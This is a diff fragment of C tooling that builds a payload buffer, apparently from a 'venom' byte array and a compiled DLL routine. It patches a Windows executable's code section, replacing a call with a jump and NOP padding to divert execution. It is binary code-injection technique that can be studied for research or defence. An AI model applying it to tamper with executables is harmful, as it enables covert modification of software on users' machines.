@@ -272,18 +272,19 @@ unsigned char venom[] =
     unsigned int* processor_entry_points = malloc(sizeof(unsigned int) * processor_count);
 
     // put venom in payload
+    /*
     {
         printf("VENOM SIZE: %u\n", VENOM_SIZE);
         memcpy(payload_buffer, venom, VENOM_SIZE);
-    } 
+    }
+    */
 
     // put processor in payload
     unsigned int entry_point_offset = 0; 
-    /*
     {
         entry_point_offset = build_single_processor(payload_buffer, "build/Process.dll", "fputs_payload");
+        printf("entry point offset: 0x%" PRIx32 "\n", entry_point_offset);
     }
-    */
 
     // change call to jump instruction
     {
@@ -295,9 +296,9 @@ unsigned char venom[] =
         
         add_instruction(mod_table, inst);
         add_nops(mod_table, 
-                exe_info->text_section->PointerToRawData + asm_state->binary_instruction_pointers[call_inst_idx] + sizeof(Instruction_RegJump), 
-                clearing_length - sizeof(Instruction_RegJump));
-        
+                exe_info->text_section->PointerToRawData + asm_state->binary_instruction_pointers[call_inst_idx] + sizeof(Instruction_JumpNear), 
+                clearing_length - sizeof(Instruction_JumpNear));
+
         printf("clearing length: %u\n", clearing_length);
         print_hex(inst->raw_data, inst->data_length);
     }
